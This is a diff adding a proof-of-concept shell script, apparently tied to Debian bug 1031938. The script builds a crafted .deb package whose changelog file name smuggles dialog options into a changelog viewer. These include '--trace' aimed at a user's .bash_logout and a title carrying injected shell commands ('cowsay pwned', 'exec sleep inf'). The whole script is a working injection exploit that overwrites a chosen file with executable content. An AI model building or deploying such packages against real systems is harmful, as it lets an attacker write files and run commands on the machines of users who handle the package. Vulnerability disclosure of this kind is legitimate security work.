@@ -1,0 +1,29 @@
+#!/bin/sh
+
+# Copyright © 2023 Jakub Wilk <jwilk@jwilk.net>
+# SPDX-License-Identifier: MIT
+
+# https://bugs.debian.org/1031938
+
+set -e -u
+umask 022
+mktargz() {
+    tar --owner root --group root --mode 'u=rwX,go=rX' -I 'gzip -9n' -cf "$@"
+}
+if tty <&1 >/dev/null
+then
+    printf '%s: cowardly refusing to print to tty\n' "${0##*/}" >&2
+    exit 1
+fi
+tmpdir=$(mktemp -d)
+cd "$tmpdir"
+printf '2.0\n' > debian-binary
+mktargz control.tar.gz debian-binary
+target=${1:-/home/alice/.bash_logout}
+options='--trace '"$target"' --title ;clear;cowsay${IFS}pwned;exec${IFS}sleep${IFS}inf; --infobox pwned 0 0 --menu 0 0 0 '
+mktargz data.tar.gz --transform "s,.*,./usr/share/doc/changelog.gz changelog.gz $options/changelog.gz," debian-binary
+pax -M dist -x ar -w debian-binary control.tar.gz data.tar.gz
+cd /
+rm -rf "$tmpdir"
+
+# vim:ts=4 sts=4 sw=4 et
